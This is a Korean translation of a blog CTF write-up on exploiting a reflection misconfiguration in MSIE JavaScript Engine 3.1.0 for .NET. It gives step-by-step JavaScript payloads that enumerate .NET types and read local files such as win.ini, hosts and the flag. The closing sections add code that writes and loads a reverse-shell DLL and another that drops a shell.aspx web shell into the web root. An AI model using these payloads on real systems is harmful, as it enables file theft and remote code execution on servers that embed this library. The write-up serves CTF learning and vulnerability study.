---
title: "NET에 맞는 JavaScript 엔진 활용 방법"
description: ""
coverImage: "/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png"
date: 2024-06-30 18:26
ogImage: 
  url: /assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png
tag: Tech
originalTitle: "Exploiting a JavaScript Engine for .NET"
link: "https://medium.com/@z4ki/exploiting-a-javascript-engine-for-net-684004b540df"
---


이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.

도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.

## 도전 설명

![도전 설명](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png)

<div class="content-ad"></div>

도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.

![이미지1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png)

![이미지2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png)

간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.

<div class="content-ad"></div>

## 어플리케이션 이해하기

첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.

JavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.

![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png)

<div class="content-ad"></div>

보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png" />

이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:

```js
function processMessage(message) {
    try {
        var objs = [];
        for (var obj in this) {
            objs.push(obj);
        }
        return "Objects: " + objs.join(", ");
    } catch (e) {
        return "Error: " + e.message;
    }
}
var response = processMessage(message);
response;
```

<div class="content-ad"></div>


![Screenshot 1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png)

우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:

```js
this.ProcessChat_Helper 
```

![Screenshot 2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png)


<div class="content-ad"></div>

결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.

```js
var jsObject = {};
this.jsObject
```

![image](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png)

그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:

<div class="content-ad"></div>

```js
// 코드 조각. 
using (var engine = new MsieJsEngine())
{
  // C# 객체를 JavaScript 컨텍스트에 노출
  engine.EmbedHostObject("ProcessChat_Helper", ProcessChatHelperObject);
  // 스크립트를 평가
  var result = engine.Evaluate<string>(script);
}
```

## C#에서의 Reflection

ProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png" />


<div class="content-ad"></div>

릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:

![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png)

간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:

```js
function processMessage(message) {
    try {
        var methods = [];
        var processChatHelper = this["ProcessChat_Helper"];
        if (processChatHelper !== undefined) {
            methods.push("Methods: " + Object.getOwnPropertyNames(processChatHelper).join(", "));
        }
        return "" + methods.join(", ");
    } catch (e) {
        return "Error: " + e.message;
    }
}
var response = processMessage(message);
response;
```

<div class="content-ad"></div>


![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png)

해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.

```js
this.ProcessChat_Helper.GetHashCode()
```

![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png)


<div class="content-ad"></div>

## 타입 및 메서드

GetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:

```js
this.ProcessChat_Helper.GetAvailableLanguages()
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png" />

<div class="content-ad"></div>

우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:

```js
// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열
var len = this.ProcessChat_Helper.GetAvailableLanguages().GetLength(0); // 2
var elements = [];
for(let i = 0; i < len; i++) {
  elements.push(this.ProcessChat_Helper.GetAvailableLanguages().GetValue(i));
}
elements.join(', ')
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png" />

지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.

<div class="content-ad"></div>

```js
var methodsArray = this.ProcessChat_Helper.GetAvailableLanguages().GetType().GetMethods(); 
var len = methodsArray.GetLength(0);
var methods = [];
for( let i = 0; i < len; i++) {
   var typeName = methodsArray.GetValue(i).ToString();
   methods.push(typeName);
};
methods.join(', ')
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png" />

이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.

```js
this.ProcessChat_Helper.GetType().BaseType
```

<div class="content-ad"></div>

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png" />

## 어셈블리

지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.

다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.

<div class="content-ad"></div>

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var len = typesArray.GetLength(0); // Array length = 2594 :"D 
var types= [];
for( let i = 0; i < len; i++) {
   types.push(typesArray.GetValue(i).ToString());
};
types.join(", ")
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png" />

어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.

## 로컬 파일 노출


<div class="content-ad"></div>

이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var len = typesArray.GetLength(0);
var types= [];
for( let i = 0; i < len; i++) {
   var typeName = typesArray.GetValue(i).ToString();
   if(typeName == "System.IO.File"){
      var index = i;
      break;
   }
};
typesArray.GetValue(index).ToString() + "Type found at index: " + index
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png" />

이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.

<div class="content-ad"></div>

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var fileTypeMethods = typesArray.GetValue(2008).GetMethods();
var len = fileTypeMethods.GetLength(0);
var methods = {};
for( let i = 0; i < len; i++) {
   var methodName = fileTypeMethods.GetValue(i).ToString();
   if(methodName.includes("ReadAllText")){
      var index = i;
      methods[i] = methodName;
   }
};
JSON.stringify(methods)
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png" />

필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var fileTypeMethods = typesArray.GetValue(2008).GetMethods();
arg = ["c:\\windows\\win.ini"];
fileTypeMethods.GetValue(49).Invoke(null, arg)
```

<div class="content-ad"></div>


![2024-06-30-ExploitingaJavaScriptEngineforNET_19](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png)

에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.

그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.

몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.


<div class="content-ad"></div>

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var len = typesArray.GetLength(0); 
var types= [];
for( let i = 0; i < len; i++) {
   var typeName = typesArray.GetValue(i).ToString();
   if(typeName == "System.Environment"){
      var typeIndex = i;
      break;
   }
};
var envType = typesArray.GetValue(typeIndex); // typeIndex = 128 
var oneElemArr = envType.GetMethod("GetCommandLineArgs").Invoke(null,null).GetValue(0); 
oneElemArr
```

<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png" />

이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var fileReadMethods = typesArray.GetValue(2008).GetMethods();
var envType = typesArray.GetValue(128);
var oneElemArr = envType.GetMethod("GetCommandLineArgs").Invoke(null,null); 
oneElemArr.SetValue("C:\\Windows\\System32\\drivers\\etc\\hosts", 0);
fileReadMethods.GetValue(49).Invoke(null, oneElemArr)
```

<div class="content-ad"></div>


<img src="/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png" />

## 플래그 읽기

이제 도전 과제의 마지막 조각인데요, c:\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.

디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.


<div class="content-ad"></div>

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var len = typesArray.GetLength(0); 
var types = [];
for( let i = 0; i < len; i++) {
   var typeName = typesArray.GetValue(i).ToString();
   if(typeName == "System.IO.Directory"){
      var typeIndex = i;
      break;
   }
};
var dirTypeMethods = typesArray.GetValue(typeIndex).GetMethods();
var len = dirTypeMethods.GetLength(0);
var methods = {};
for( let i = 0; i < len; i++) {
   var methodName = dirTypeMethods.GetValue(i).ToString();
   if(methodName.includes("GetFiles")){
      var index = i;
      methods[i] = methodName;
   }
};
var getFilesMethod = dirTypeMethods.GetValue(17); // GetFile(String) at index 17
var envType = typesArray.GetValue(128);
var oneElemArr = envType.GetMethod("GetCommandLineArgs").Invoke(null,null); 
oneElemArr.SetValue("C:\\Temp", 0);
// Getting all the filenames in the c:\\temp
tempFilesArr = getFilesMethod.Invoke(null, oneElemArr);
var len = tempFilesArr.GetLength(0);
var fileReadMethod = typesArray.GetValue(2008).GetMethods().GetValue(49);
for( let i = 0; i < len; i++) {
   var fileName = tempFilesArr.GetValue(i);
   oneElemArr.SetValue(fileName, 0);
   // the Flag filename contais Flag and some other random values
   if(fileName.includes("Flag")) {
     // read the flag file
     var fileContent = fileReadMethod.Invoke(null, oneElemArr);
     break;
   }
};
fileContent
```

![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png)

## 원격 코드 실행

RCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.


<div class="content-ad"></div>

RCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var fileTypeMethods = typesArray.GetValue(2008).GetMethods();
var writeFileMethod = fileTypeMethods.GetValue(51);
var writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();
writeFileArgs.SetValue("c:\\temp\\z4ki.dll", 0);
writeFileArgs.SetValue("\x7a\x34\x6b\x69", 1); // <--  여기를 편집하세요
writeFileMethod.Invoke(null, writeFileArgs);
var assemblyType = objectClass.Assembly.GetType().BaseType
var oneElemArr = objectClass.Assembly.GetTypes().GetValue(128).GetMethod("GetCommandLineArgs").Invoke(null,null);
oneElemArr.SetValue("C:\\Temp\\z4ki.dll",0);
assemblyType.GetMethod("LoadFile").Invoke(null,oneElemArr);
```

## 또 다른 RCE 방법

다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.

<div class="content-ad"></div>

```js
var objectClass = this.ProcessChat_Helper.GetType().BaseType;
var typesArray = objectClass.Assembly.GetTypes();
var fileTypeMethods = typesArray.GetValue(2008).GetMethods();
var writeFileMethod = fileTypeMethods.GetValue(51);
var writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();
writeFileArgs.SetValue("c:\\ChatBot\\wwwroot\\shell.aspx", 0);
writeFileArgs.SetValue("\x7a\x34\x6b\x69", 1); // <--  여기를 수정하세요
writeFileMethod.Invoke(null, writeFileArgs);
```

이제 http://`ip`/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.

여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.
